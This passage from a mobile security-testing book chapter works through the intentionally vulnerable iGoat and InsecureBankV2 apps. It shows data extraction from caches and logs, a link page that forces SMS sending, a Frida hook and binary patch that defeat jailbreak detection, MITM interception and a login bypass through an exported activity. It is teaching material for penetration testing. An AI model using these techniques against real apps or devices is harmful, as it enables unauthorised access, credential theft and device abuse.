<p>You might also find sensitive data in the HTTP caches, which websites use to improve performance by reusing previously fetched resources. The app stores these resources in its <em>/Library/Caches/</em> folder in a SQLite database named <em>Cache.db.</em> For example, you can solve the Data Protection (Rest) category’s Webkit Cache challenge in the app functionalities by retrieving the cached data from this file. Load the database and then retrieve the contents of the <code>cfurl_cache_receiver_data</code> table, which contains the cached HTTP responses:</p>
<pre><code>$<b> cd data/Containers/Data/Application/&lt;application-id&gt;/Library/Caches/com.swaroop.iGoat/</b>
<span epub:type="pagebreak" title="351" id="Page_351"/>$<b> sqlite3 Cache.db</b>
sqlite&gt; <b>select * from cfurl_cache_receiver_data;</b>
1|0|&lt;table border='1'&gt;&lt;tr&gt;&lt;td&gt;key&lt;/td&gt;&lt;td&gt;<b>66435@J0hn</b>&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</code></pre>
<p>A similar vulnerability affects the popular Hickory Smart app for iOS versions 01.01.07 and earlier; the app controls smart deadbolts. The app’s database was found to contain information that could allow attackers to remotely unlock doors and break into homes (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5633/" class="LinkURL">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5633/</a>). </p>
<h4 id="h3-500907c14-0009">Inspecting Application Logs and Forcing the Device to Send Messages</h4>
<p class="BodyFirst">Moving forward with our assessment, we can inspect the application logs to identify leaked debug strings that might help us to infer the application business logic. You can retrieve the logs through the Console app’s interface, which is preinstalled in macOS, as shown in <a id="figureanchor14-7" href="#figure14-7">Figure 14-7</a>. </p>
<figure>
<img src="Images/f14007.png" alt="f14007" width="750" height="25"/>
<figcaption><p><a id="figure14-7">Figure 14-7:</a> Exposed encryption password in iOS device logs</p></figcaption>
</figure>
<p>You can also retrieve them using the Xcrun tool: </p>
<pre><code>$<b> `xcrun simctl spawn booted log stream &gt; sim.log&amp;`; open sim.log;</b></code></pre>
<p>The device logs contain an encryption key that you can use to authenticate in the Key Management category’s Random Key Generation challenge in the app functionalities. It seems that although the application correctly generated an encryption key for authentication purposes, this key was leaked in the logs, so an attacker with physical access to a computer and a paired device could obtain it. </p>
<p>A careful inspection of the logs while the other app functionalities are in use reveals that the app uses the URL scheme we identified on page 344 to send an internal message, as shown in <a id="figureanchor14-8" href="#figure14-8">Figure 14-8</a>.</p>
<figure>
<img src="Images/f14008.png" alt="f14008" width="750" height="29"/>
<figcaption><p><a id="figure14-8">Figure 14-8:</a> Exposed URL scheme parameters in iOS device logs</p></figcaption>
</figure>
<p>Let’s verify this behavior by using the <code>xcrun</code> command to open a URL with a similar structure in the simulator’s browser:</p>
<pre><code>$<b> xcrun simctl openurl booted</b> <b>“iGoat://?contactNumber=+1000000&amp;message=hacked”</b></code></pre>
<p>To exploit this vulnerability, we could create a fake HTML page that would load the URL when the browser renders the included HTML elements and then force the victim to send multiple unsolicited messages of <span epub:type="pagebreak" title="352" id="Page_352"/>this type. You can use the following HTML to conduct this attack when the user clicks the link. This attack would let you successfully pass the URL Scheme challenge in the app functionalities:</p>
<pre><code>&lt;html&gt;
&lt;a href="iGoat://?contactNumber=+1000000&amp;message=hacked"/&gt; click here&lt;/a&gt;
&lt;/html&gt;</code></pre>
<p><a id="figureanchor14-9" href="#figure14-9">Figure 14-9</a> shows that we succeeded in sending a text message from the user’s phone.</p>
<figure>
<img src="Images/f14009.png" alt="f14009" width="424" height="278"/>
<figcaption><p><a id="figure14-9">Figure 14-9:</a> Abuse of the exposed URL scheme to force a victim to send SMS messages</p></figcaption>
</figure>
<p>This vulnerability could be extremely useful; in some cases, it could let you remotely control IoT devices that receive commands via text messages from authorized numbers. Smart car alarms often have this feature.</p>
<h4 id="h3-500907c14-0010">Application Snapshots</h4>
<p class="BodyFirst">Another common way data gets leaked in iOS apps is through app screenshots. When the user selects the home button, iOS takes a screenshot of the app by default and stores it in the file system in cleartext. This screenshot can contain sensitive data, depending on the screen the user was viewing. You can replicate this issue in the Side Channel Data Leaks category’s Backgrounding challenge in the app functionalities.</p>
<p>Using the following commands, you can navigate to the application’s <em>Snapshots</em> folder, where you might find currently saved snapshots:</p>
<pre><code>$<b> cd data/Containers/Data/Application/&lt;application-id&gt;/Library/Caches/Snapshots/com.swaroop.iGoat/</b>
$<b> open E6787662-8F9B-4257-A724-5BD79207E4F2\@3x.ktx</b></code></pre>
<h4 id="h3-500907c14-0011"><span epub:type="pagebreak" title="353" id="Page_353"/>Testing for Pasteboard and Predictive Text Engine Data Leaks</h4>
<p class="BodyFirst">Additionally, iOS apps commonly suffer from pasteboard and predictive text engine data leaks. The <em>pasteboard</em> is a buffer that helps users share data between different application interfaces, or even between different applications, when they select a cut, copy, or duplicate operation from a system-provided menu. But this exact functionality might unintentionally disclose sensitive information, such as the user’s password, to third-party malicious apps that are monitoring this buffer, or to other users on a shared IoT device. </p>
<p>The <em>predictive text engine</em> stores words and sentences that a user types and then automatically suggests them the next time the user attempts to fill an input, improving the overall writing speed. But attackers can easily find this sensitive data in a jailbroken device’s filesystem by navigating to the following folder: </p>
<pre><code>$<b> cd data/Library/Keyboard/en-dynamic.lm/</b></code></pre>
<p>Using this knowledge, you can easily solve the Side Channel Data Leaks category’s Keystroke Logging and the Cut-and-Paste challenges in the app functionalities.</p>
<p>The Huawei HiLink app for iOS contained an information-leak vulnerability of this type (<a href="https://www.cvedetails.com/cve/CVE-2017-2730/" class="LinkURL">https://www.cvedetails.com/cve/CVE-2017-2730/</a>). The app works with many Huawei products, such as Huawei Mobile WiFi (E5 series), Huawei routers, Honor Cube, and Huawei home gateways. The vulnerability allowed attackers to collect user information about the iPhone model and firmware version and potentially track the vulnerable devices.</p>
<h3 id="h2-500907c14-0013">Injection Attacks </h3>
<p class="BodyFirst">Although XSS injection is a very common vulnerability in web applications, it’s difficult to find in mobile apps. But you’ll sometimes see it in cases when an app uses WebView to present untrusted content. You can test such a case in the Injection Flaws category’s Cross Site Scripting challenge in the app functionalities by injecting a simple JavaScript payload between script tags in the provided input field (<a id="figureanchor14-10" href="#figure14-10">Figure 14-10</a>).</p>
<figure>
<img src="Images/f14010.png" alt="f14010" width="176" height="248"/>
<figcaption><p><a id="figure14-10">Figure 14-10:</a> An XSS attack in the examined application</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="354" id="Page_354"/>An adversary able to exploit an XSS vulnerability in WebView could access any sensitive information currently rendered, as well as the HTTP authentication cookies that might be in use. They could even tamper with the presented web page by adding customized phishing content, such as fake login forms. In addition, depending on the WebView configuration and the platform framework support, the attacker might also access local files, exploit other vulnerabilities in supported WebView plug-ins, or even perform requests to native function calls. </p>
<p>It might also be possible to perform a SQL injection attack on mobile apps. If the application uses the database to log usage statistics, the attack would most likely fail to alter the application flow. On the contrary, if the application uses the database for authentication or restricted content retrieval and a SQL injection vulnerability is present, we might be able to bypass that security mechanism. If we can modify data to make the application crash, we can turn the SQL injection into a denial-of-service attack. In the Injection Flaws category’s SQL Injection challenge in the app functionalities, you can use a SQL injection attack vector to retrieve unauthorized content using a malicious SQL payload. </p>
<p>Note that since iOS 11, the iPhone keyboard contains only a single quotation mark instead of the ASCII vertical apostrophe character. This omission might increase the difficulty of exploiting certain SQL vulnerabilities, which often require an apostrophe to create a valid statement. It’s still possible to disable this feature programmatically using the <code>smartQuotesType</code> property (<a href="https://developer.apple.com/documentation/uikit/uitextinputtraits/2865931-smartquotestype/" class="LinkURL">https://developer.apple.com/documentation/uikit/uitextinputtraits/2865931-smartquotestype/</a>).</p>
<h3 id="h2-500907c14-0014">Keychain Storage</h3>
<p class="BodyFirst">Many applications store secrets using the <em>keychain service API</em>, a platform-provided encrypted database. In the iOS simulator, you can obtain those secrets by opening a simple SQL database. You might need to use the <code>vacuum</code> command to merge the data from the SQLite system’s<em> Write-Ahead-Logging</em> mechanism. This popular mechanism is designed to provide durability to multiple database systems. </p>
<p>If the app is installed on a physical device, you’ll first need to jailbreak the device and then use a third-party tool to dump the keychain records. Possible tools include the Keychain Dumper (<a href="https://github.com/ptoomey3/Keychain-Dumper/" class="LinkURL">https://github.com/ptoomey3/Keychain-Dumper/</a>), the IDB tool (<a href="https://www.idbtool.com/" class="LinkURL">https://www.idbtool.com/</a>), and the Needle (<a href="https://github.com/FSecureLABS/needle/" class="LinkURL">https://github.com/FSecureLABS/needle/</a>). In the iOS simulator, you could also use the iGoat Keychain Analyzer included in the iGoat app. This tool only works for the iGoat app.</p>
<p>Using the retrieved records, you can now solve the Data Protection (Rest) category’s Keychain Usage challenge in the app functionalities. You must first uncomment the <code>[self storeCredentialsInKeychain] </code>function call in the <em>iGoat/Key Chain/KeychainExerciseViewController.m</em> file to configure the application to use the keychain service API.</p>
<h3 id="h2-500907c14-0015"><span epub:type="pagebreak" title="355" id="Page_355"/>Binary Reversing</h3>
<p class="BodyFirst">Developers usually hide secrets in the application source code’s business logic. Because the source code isn’t always available, we’ll examine the binary by reversing the assembly code.  For this purpose, you could use an open source tool like Radare2 (<a href="https://rada.re/n/" class="LinkURL">https://rada.re/n/</a>). </p>
<p>Before the examination, we have to <em>thin</em> the binary. Thinning the binary only isolates a specific architecture’s executable code. You can find versions of the iOS binary in either the MACH0 or FATMACH0 format, which includes ARM6, ARM7, and ARM64 executables. We only want to analyze one of these, the ARM64 executable, which you can easily extract using the <code>rabin2</code> command: </p>
<pre><code>$<b> rabin2 -x iGoat </b>
iGoat.fat/iGoat.arm_32.0 created (23729776)
iGoat.fat/iGoat.arm_64.1 created (24685984)</code></pre>
<p>We can then load and perform an initial analysis on the binary using the <code>r2</code>command: </p>
<pre><code>$<b> r2 -A iGoat.fat/iGoat.arm_64.1 </b>
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
...
[0x1000ed2dc]&gt; <span class="CodeAnnotation">1</span> <b>fs</b> 
 6019 * classes
   35 * functions
  442 * imports
  …</code></pre>
<p>The analysis will associate names, called <em>flags</em>, with specific offsets in the binary, such as sections, functions, symbols, and strings. We can obtain a summary of these flags using the <code>fs</code> command <span class="CodeAnnotation">1</span> and get a more detailed list using the <code>fs; f</code> command.</p>
<p>Use the <code>iI</code> command to retrieve information regarding the binary: </p>
<pre><code>[0x1000ed2dc]&gt; <b>iI~crypto</b>
<span class="CodeAnnotationHang">1</span> crypto   false 
[0x1000ed2dc]&gt; <b>iI~canary</b>
<span class="CodeAnnotationHang">2</span> canary   true </code></pre>
<p>Inspect the returned compilation flags. Those we see here indicate that the specific binary has been compiled with Stack Smashing Protection <span class="CodeAnnotation">2</span> but hasn’t been encrypted by Apple Store <span class="CodeAnnotation">1</span>.</p>
<p>Because iOS apps are usually written in Objective-C, Swift, or  C++, they store all symbolic information in the binary; you can load it using the <em>ojbc.pl</em> script included in the <code>Radare2</code> package. This script generates shell commands based on these symbols and the corresponding addresses that you can use to update the Radare2 database:</p>
<pre><code>$<b> objc.pl iGoat.fat/iGoat.arm_64.1</b>
f objc.NSString_oa_encodedURLString = 0x1002ea934</code></pre>
<p><span epub:type="pagebreak" title="356" id="Page_356"/>Now that all the existing metadata has been loaded into the database, we can search for specific methods and use the <code>pdf</code> command to retrieve the assembly code: </p>
<pre><code>[0x003115c0]&gt; <b>fs; f | grep Broken </b>
0x1001ac700 0 objc.BrokenCryptographyExerciseViewController_getPathForFilename
0x1001ac808 1 method.BrokenCryptographyExerciseViewController.viewDidLoad
…
[0x003115c0]&gt; <b>pdf @method.BrokenCryptographyExerciseViewController.viewDidLoad</b> 
| (fcn) sym.func.1001ac808 (aarch64) 568
|   sym.func.1001ac808 (int32_t arg4, int32_t arg2, char *arg1);
| |||||||   ; var void *var_28h @ fp-0x28
| |||||||   ; var int32_t var_20h @ fp-0x20
| |||||||   ; var int32_t var_18h @ fp-0x18</code></pre>
<p>It’s also possible to use the <code>pdc</code>command to generate pseudocode and decompile the specific function. In this case, Radare2 automatically resolves and presents references to other functions or strings:</p>
<pre><code>[0x00321b8f]&gt; <b>pdc @method.BrokenCryptographyExerciseViewController.viewDidLoad</b>
function sym.func.1001ac808 () {
    loc_0x1001ac808:
         …
x8 = x8 + 0xca8          //0x1003c1ca8 ; str.cstr.b_nkP_ssword123 ; (cstr 0x10036a5da) "b@nkP@ssword123" </code></pre>
<p>We can easily extract the hardcoded value <code>b@nkP@ssword123</code>, which you can use to authenticate in the Key Management category’s Hardcoded Keys challenge in the app functionalities. </p>
<p>Using a similar tactic, researchers found a vulnerability in earlier versions of the MyCar Controls mobile app (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9493/" class="LinkURL">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9493/</a>). The app allows users to remotely start, stop, lock, and unlock their car. It contained hardcoded admin credentials.</p>
<h3 id="h2-500907c14-0016">Intercepting and Examining Network Traffic</h3>
<p class="BodyFirst">Another important part of an iOS app assessment is to examine its network protocol and the requested server API calls. Most mobile apps primarily use the HTTP protocol, so we’ll focus on it here. To intercept the traffic, we’ll use the community version of Burp Proxy Suite, which initiates a web proxy server that sits as a man-in-the-middle between the mobile and destination web server. You can find it at <a href="https://portswigger.net/burp/" class="LinkURL">https://portswigger.net/burp/</a>.</p>
<p>To relay the traffic, you’ll need to perform a man-in-the-middle attack, which you can do in numerous ways. Because we’re just trying to analyze the app, not re-create a realistic attack, we’ll follow the easiest attack path: configuring an HTTP proxy on the device within the network settings. In a physical Apple device, you can set an HTTP proxy by navigating to the connected wireless network. Once there, alter the proxy option of the macOS system to the external IPv4 address where you’ll run Burp Proxy Suite using port 8080. In the iOS simulator, set the global system proxy from <span epub:type="pagebreak" title="357" id="Page_357"/>the macOS network settings, making sure to set <b>Web Proxy (HTTP)</b> and <b>Secure Web Proxy (HTTPS)</b> to the same value. </p>
<p>After configuring the proxy settings on an Apple device, all the traffic will redirect to Burp Proxy Suite. For example, if we use the Authentication task in the iGoat app, we could capture the following HTTP request, which contains a username and password:</p>
<pre><code>GET /igoat/token?username=<b>donkey</b>&amp;password=<b>hotey</b> HTTP/1.1
Host: localhost:8080
Accept: */*
User-Agent: iGoat/1 CFNetwork/893.14 Darwin/17.2.0
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: close</code></pre>
<p>If the app used SSL to protect the intermediate communication, we’d have to perform the extra step of installing a specially crafted SSL certificate authority (CA) to our testing environment. Burp Proxy Suite can automatically generate this CA for us. You can obtain it by navigating to the proxy’s IP address using a web browser and then clicking the <b>Certificate</b> link at the top right of the screen.</p>
<p>The Akerun Smart Lock Robot app for iOS (<a href="https://www.cvedetails.com/cve/CVE-2016-1148/" class="LinkURL">https://www.cvedetails.com/cve/CVE-2016-1148/</a>) contained a similar issue. More precisely, researchers discovered that all application versions earlier than 1.2.4 don’t verify SSL certificates, allowing man-in-the-middle attackers to eavesdrop on encrypted communications with the smart lock device.</p>
<h3 id="h2-500907c14-0017">Avoiding Jailbreak Detection Using Dynamic Patching</h3>
<p class="BodyFirst">In this section, we’ll tamper with the application code as it’s executed in the device memory and dynamically patch one of its security controls to circumvent it. We’ll target the control that performs the environment integrity check. To perform this attack, we’ll use the Frida instrumentation framework (<a href="https://frida.re/" class="LinkURL">https://frida.re/</a>). You can install it as follows using the <code>pip</code> package manager for Python:</p>
<pre><code>$ <b>pip install frida-tools</b></code></pre>
<p>Next, locate the function or API call that performs the environment integrity check. Because the source code is available, we can easily spot the function call in the <code>iGoat/String Analysis/Method Swizzling/MethodSwizzlingExerciseController.m</code> class. This security check only works on physical devices, so you won’t see any difference when it’s active in the simulator:</p>
<pre><code>assert((NSStringFromSelector(_cmd) isEqualToString:@”fileExistsAtPath:”]);
// Check for if this is a check for standard jailbreak detection files
if ([path hasSuffix:@”Cydia.app”] ||
    [path hasSuffix:@”bash”] ||
    [path hasSuffix:@”MobileSubstrate.dylib”] ||
    [path hasSuffix:@”sshd”] ||
    [path hasSuffix:@”apt”])_</code></pre>
<p><span epub:type="pagebreak" title="358" id="Page_358"/>By dynamically patching this function, we can force the return parameter to always be successful. Using the Frida framework, we create a file called <em>jailbreak.js</em> with code that does just that:</p>
<pre><code><span class="CodeAnnotation">1</span> var hook = ObjC.classes.NSFileManager["- fileExistsAtPath:"];
<span class="CodeAnnotation">2</span> Interceptor.attach(hook.implementation, {
        onLeave: function(retval) {
        <span class="CodeAnnotationCode">3</span> retval.replace(0x01); 
        },
    });</code></pre>
<p>This Frida code starts by searching for the Objective-C function <code>fileExistsAtPath</code> from the <code>NSFileManager</code> class and returns a pointer to this function <span class="CodeAnnotation">1</span>. Next, it attaches an interceptor to this function <span class="CodeAnnotation">2</span> that dynamically sets a callback named <code>onLeave</code>. This callback will execute at the end of the function, and it’s configured to always replace the original return value with <code>0x01</code> (the success code) <span class="CodeAnnotation">3</span>. </p>
<p>Then we apply the patch by attaching the Frida tool to the corresponding application process:</p>
<pre><code>$ <b>frida -l jailbreak.js -p 59843</b></code></pre>
<p>You can find the exact Frida framework syntax for patching Objective-C methods in the online documentation at <a href="https://frida.re/docs/javascript-api/#objc/" class="LinkURL">https://frida.re/docs/javascript-api/#objc/</a>.</p>
<h3 id="h2-500907c14-0018">Avoiding Jailbreak Detection Using Static Patching</h3>
<p class="BodyFirst">You could circumvent jailbreak detection using static patching, too. Let’s use Radare2 to examine the assembly and patch the binary code. For example, we can replace the comparison of the <code>fileExists</code> result with a statement that is always true. You can find the function <code>fetchButtonTapped </code>at <em>iGoat/String Analysis/Method Swizzling/MethodSwizzlingExerciseController.m</em>:</p>
<pre><code>-(IBAction)fetchButtonTapped:(id)sender {
    ...
    if (fileExists) 
        [self displayStatusMessage:@"This app is running on ...
    else
        [self displayStatusMessage:@"This app is not running on ...</code></pre>
<p>Because we want to reinstall the patched version of the code in the simulator, we’ll work with the app’s<em> Debug-iphonesimulator</em> version, which is located in the Xcode-derived data folder we mentioned on page 343. First, we open the binary in write mode using the -w  parameter: </p>
<pre><code>$ <b>r2 -Aw ~/Library/Developer/Xcode/DerivedData/iGoat-&lt;application-id&gt;/Build/Products/Debug-iphonesimulator/iGoat.app/iGoat </b>
[0x003115c0]&gt; <b>fs; f | grep fetchButtonTapped</b>
0x1000a7130 326 sym.public_int_MethodSwizzlingExerciseController::fetchButtonTapped_int
<span epub:type="pagebreak" title="359" id="Page_359"/>0x1000a7130 1 method.MethodSwizzlingExerciseController.fetchButtonTapped:
0x100364148 19 str.fetchButtonTapped:</code></pre>
<p>This time, instead of requesting that Radare2 disassemble or decompile the app with the <code>pdf</code> and <code>pdc</code> commands, we’ll change to the graph view by using the <code>VV</code> command and then pressing <b>p</b> on the keyboard. This representation is easier for locating business logic switches:</p>
<pre><code>[0x1000ecf64]&gt; <b>VV @ method.MethodSwizzlingExerciseController.fetchButtonTapped: </b></code></pre>
<p>This command should open the graph view shown in <a id="figureanchor14-11" href="#figure14-11">Figure 14-11</a>. </p>
<figure>
<img src="Images/f14011.png" alt="f14011" width="750" height="256"/>
<figcaption><p><a id="figure14-11">Figure 14-11:</a> The Radare2 graph view representing the logic switch  </p></figcaption>
</figure>
<p>An easy way to disable the comparison is by replacing the <code>je</code> command (opcode <code>0x0F84</code>) with the <code>jne</code> command (opcode <code>0x0F85</code>), which returns the exact opposite result. As a consequence, when the processor reaches this step, it will continue execution in the block and report that the device isn’t jailbroken. </p>
<p>Note that this version of the binary is designed for the iOS simulator. The binary for the iOS device would contain the equivalent ARM64 operation of <code>TBZ</code>.</p>
<p>Change the view by pressing <b>q</b> to quit the graph view and then pressing <b>p</b> to enter assembly mode. This allows us to get the address of the operation in the binary (you could also use <code>pd</code> directly): </p>
<pre><code>[0x003115c0]&gt;<b> </b><b>q </b>
[0x003115c0]&gt;<b> </b><b>p </b>
…
0x1000a7218      f645e701       test byte [var_19h], 1
          &lt; 0x1000a721c      0f8423000000   je 0x1000a7245
...
[0x1000f7100]&gt; <b>wx 0f8523000000 @ 0x1000a721c</b></code></pre>
<p>Then we can re-sign and reinstall the app in the simulator: </p>
<pre><code>$<b> /usr/bin/codesign --force --sign - --timestamp=none ~/Library/Developer/Xcode/DerivedData/iGoat-&lt;application-id&gt;/Build/Products/Debug-iphonesimulator/iGoat.app</b>
replacing existing signature</code></pre>
<p><span epub:type="pagebreak" title="360" id="Page_360"/>If we were working on a physical device, we’d have to use one of the binary re-signing techniques to install the modified binary.</p>
<h2 id="h1-500907c14-0004">Analyzing Android Applications</h2>
<p class="BodyFirst">In this section, we’ll analyze the insecure Android app InsecureBankV2. Like iGoat, this isn’t an IoT companion app, but we’ll focus on vulnerabilities relevant to IoT devices. </p>
<h3 id="h2-500907c14-0019">Preparing the Test Environment</h3>
<p class="BodyFirst">Android has no environment restrictions, and you can perform a successful assessment whether your operating system is running on Windows, macOS, or Linux. To set up the environment, install the Android Studio IDE (<a href="https://developer.android.com/studio/releases/" class="LinkURL">https://developer.android.com/studio/releases/</a>). Alternatively, you can install the Android software development kit (SDK) and the Android SDK Platform Tools directly by downloading the ZIP files from the same website.</p>
<p>Start the included <em>Android Debug Bridge service</em>, which is the binary that interacts with Android devices and emulators, and identify the connected devices using the following command:</p>
<pre><code>$<b> adb start-server</b>
* daemon not running; starting now at tcp:5037
* daemon started successfully</code></pre>
<p>Currently, no emulators or devices are connected to our host. We can easily create a new emulator using the Android Virtual Device (AVD) Manager, which is included in the Android Studio and the Android SDK tools. Access AVD, download the Android version you want, install it, name your emulator, run it, and you’re ready to go.</p>
<p>Now that we’ve created an emulator, let’s try to access it by running the following commands, which will list the devices connected to your system. These devices might be actual devices or emulators:</p>
<pre><code>$<b> adb devices</b>
emulator-5554	device   </code></pre>
<p>Excellent, an emulator was detected. Now we’ll install the vulnerable Android app in the emulator. You can find InsecureBankV2 at <a href="https://github.com/dineshshetty/Android-InsecureBankv2/" class="LinkURL">https://github.com/dineshshetty/Android-InsecureBankv2/</a>. Android apps use a file format called the Android Package (APK). To install the InsecureBankV2 APK to our emulator device, navigate to your target application folder and then use the following command: </p>
<pre><code>$<b> adb -s emulator-5554 install app.apk</b>
Performing Streamed Install
Success</code></pre>
<p>You should now see the application’s icon in the simulator, indicating the installation succeeded. You should also run InsecureBankV2 AndroLab, <span epub:type="pagebreak" title="361" id="Page_361"/>a python2 backend server using the commands which can be found in the same GitHub repository.</p>
<h3 id="h2-500907c14-0020">Extracting an APK</h3>
<p class="BodyFirst">In some cases, you might want to investigate a specific APK file separately from the rest of the Android device. To do this, use the following commands to extract an APK from a device (or emulator). Before extracting a package, we need to know its path. We can identify the path by listing the relevant packages:</p>
<pre><code>$<b> adb shell </b><b>pm list packages  </b>
com.android.insecurebankv2</code></pre>
<p>Once we’ve identified the path, we extract the application by using the <code>adb pull</code> command:</p>
<pre><code>$ <b>adb shell pm path com.android.insecurebankv2 </b>
package:/data/app/com.android.insecurebankv2-Jnf8pNgwy3QA_U5f-n_4jQ==/base.apk
$ <b>adb pull /data/app/com.android.insecurebankv2-Jnf8pNgwy3QA_U5f-n_4jQ==/base.apk</b>
: 1 file pulled. 111.6 MB/s (3462429 bytes in 0.030s)</code></pre>
<p>This command extracts the APK to your host system’s current working directory. </p>
<h3 id="h2-500907c14-0021">Static Analysis</h3>
<p class="BodyFirst">Let’s start with static analysis by examining the APK file, which you’ll first need to decompress. Use the <code>apktool</code> (<a href="https://ibotpeaches.github.io/Apktool/" class="LinkURL">https://ibotpeaches.github.io/Apktool/</a>) to extract all the relevant information from the APK without losing any data: </p>
<pre><code>$ <b>apktool d app.apk</b> 
I: Using Apktool 2.4.0 on app.apk
I: Loading resource table...
….</code></pre>
<p>One of the most important files in the APK is <em>AndroidManifest.xml</em>. The Android manifest is a binary-encoded file containing information such as the Activities used. <em>Activities,</em> in an Android app, are the screens in the application’s user interface. All Android apps have at least one Activity, and the name of the main one is included in the manifest file. This Activity executes when you launch the app. </p>
<p>In addition, the manifest file contains the permissions that the app requires, the supported Android versions, and <em>Exported </em>Activities, which might be prone to vulnerabilities, among other features. An Exported Activity is a user interface that components of different applications can launch. </p>
<p>The <em>classes.dex</em>file contains the application’s source code in a Dalvik Executable (DEX) file format. Inside the <em>META-INF</em> folder, you’ll find various metadata from the APK file. In the <em>res</em>folder, you’ll find compiled resources, and in the <em>assets</em> folder, you’ll find the application’s assets. We’ll devote most of our time to exploring <em>AndroidManifest.xml</em> and the DEX format files. </p>
<h4 id="h3-500907c14-0012"><span epub:type="pagebreak" title="362" id="Page_362"/>Automating Static Analysis</h4>
<p class="BodyFirst">Let’s explore some tools that will help you perform static analysis. But be wary of basing your entire test on just automated tools, because they’re not perfect and you might miss a critical issue.</p>
<p>You can use Qark (<a href="https://github.com/linkedin/qark/" class="LinkURL">https://github.com/linkedin/qark/</a>) to scan the source code and an application’s APK file. With the following command, we perform static analysis on the binary: </p>
<pre><code>$<b> qark --apk path/to/my.apk</b>
Decompiling sg/vantagepoint/a/a...
...
Running scans...
Finish writing report to /usr/local/lib/python3.7/site-packages/qark/report/report.html ...</code></pre>
<p>This will take some time. Aside from Qark, you can use the MobSF tool mentioned earlier in this chapter. </p>
<h3 id="h2-500907c14-0022">Binary Reversing</h3>
<p class="BodyFirst">The Qark tool you just ran reversed the binary to perform checks on it. Let’s try to do this manually. When you extracted files from the APK, you were provided with a bunch of DEX files containing compiled app code. Now we’ll translate this bytecode to make it more readable. </p>
<p>For this purpose, we’ll use the Dex2jartool (<a href="https://github.com/pxb1988/dex2jar/" class="LinkURL">https://github.com/pxb1988/dex2jar/</a>) to convert the bytecode to a JAR file: </p>
<pre><code>$<b> d2j-dex2jar.sh app.apk </b>
dex2jar app.apk -&gt; ./app-dex2jar.jar</code></pre>
<p>Another great tool for this purpose is Apkx(<a href="https://github.com/b-mueller/apkx/" class="LinkURL">https://github.com/b-mueller/apkx/</a>), which is a wrapper for different decompilers. Remember that even if one decompiler fails, another one might succeed. </p>
<p>Now we’ll use a JAR viewer to browse the APK source code and read it easily. A great tool for this purpose is JADX<code>(-gui)(</code><a href="https://github.com/skylot/jadx/" class="LinkURL">https://github.com/skylot/jadx/</a>). It basically attempts to decompile the APK and allows you to navigate through the decompiled code in highlighted text format. If given an already decompiled APK, it will skip the decompiling task. </p>
<p>You should see the app broken down into readable files for further analysis. <a id="figureanchor14-12" href="#figure14-12">Figure 14-12</a> shows the contents of one such file. </p>
<figure>
<img src="Images/f14012.png" alt="f14012" width="520" height="152"/>
<figcaption><p><a id="figure14-12">Figure 14-12:</a> Contents of <code>CryptoClass</code> depicting the value of the variable key</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="363" id="Page_363"/>In <code>CryptoClass</code>, we’ve already uncovered an issue: a hardcoded key. This key appears to be a secret for some cryptographic functions.</p>
<p>Researchers found a similar vulnerability in EPSON’s iPrint application version 6.6.3 (<a href="https://www.cvedetails.com/cve/CVE-2018-14901/" class="LinkURL">https://www.cvedetails.com/cve/CVE-2018-14901/</a>), which allowed users to remotely control their printing devices. The app contained hardcoded API and Secret keys for the Dropbox, Box, Evernote, and OneDrive services.</p>
<h3 id="h2-500907c14-0023">Dynamic Analysis</h3>
<p class="BodyFirst">Now we’ll move onto dynamic analysis. We’ll use Drozer, a tool that helps us test Android permissions and exported components (<a href="https://github.com/FSecureLABS/drozer/" class="LinkURL">https://github.com/FSecureLABS/drozer/</a>). Note that Drozer has stopped being developed, but it’s still useful for simulating rogue applications. Let’s find more information about our application by issuing the following command:</p>
<pre><code>dz&gt; <b>run app.package.info -a com.android.insecurebankv2</b>
Package: com.android.insecurebankv2
  Process Name: com.android.insecurebankv
  Data Directory: /data/data/com.android.insecurebankv2
  APK Path: /data/app/com.android.insecurebankv2-1.apk
  UID: 10052
  GID: [3003, 1028, 1015]
  Uses Permissions:
  - android.permission.INTERNET
  - android.permission.WRITE_EXTERNAL_STORAGE
  - android.permission.SEND_SMS
  ...</code></pre>
<p>Look at this high-level overview. From here, we can go a bit deeper by listing the app’s attack surface. This will provide us with enough information to identify Exported Activities, broadcast receivers, content providers, and services. All these components might be configured poorly and thus be prone to security vulnerabilities:</p>
<pre><code>dz&gt; <b>run app.package.attacksurface com.android.insecurebankv2</b>
Attack Surface:
<span class="CodeAnnotationHang">1</span> 5 activities exported 
1 broadcast receivers exported
1 content providers exported
0 services exported</code></pre>
<p>Even though this is a small app, it looks like it’s exporting various components, the majority of which are Activities <span class="CodeAnnotation">1</span>. </p>
<h4 id="h3-500907c14-0013">Resetting User Passwords</h4>
<p class="BodyFirst">Let’s take a closer look at the exported components: it’s possible these Activities don’t require special permissions to view: </p>
<pre><code>dz&gt; <b>run app.activity.info -a com.android.insecurebankv2</b>
Package: com.android.insecurebankv2
com.android.insecurebankv2.LoginActivity 
<span epub:type="pagebreak" title="364" id="Page_364"/>    Permission: null
<span class="CodeAnnotationHang">1</span> com.android.insecurebankv2.PostLogin 
    Permission: null
<span class="CodeAnnotationHang">2</span> com.android.insecurebankv2.DoTransfer 
    Permission: null
<span class="CodeAnnotationHang">3</span> com.android.insecurebankv2.ViewStatement 
    Permission: null
<span class="CodeAnnotationHang">4</span> com.android.insecurebankv2.ChangePassword 
    Permission: null</code></pre>
<p>It looks like the Activities don’t have any permissions and third-party apps can trigger them. </p>
<p>By accessing the <code>PostLogin</code><span class="CodeAnnotation">1</span>Activity, we can bypass the login screen, which looks like a win. Access that specific Activity  through the Adb tool, as demonstrated here, or Drozer:</p>
<pre><code>$<b> adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin</b>
Starting: Intent { cmp=com.android.insecurebankv2/.PostLogin </code></pre>
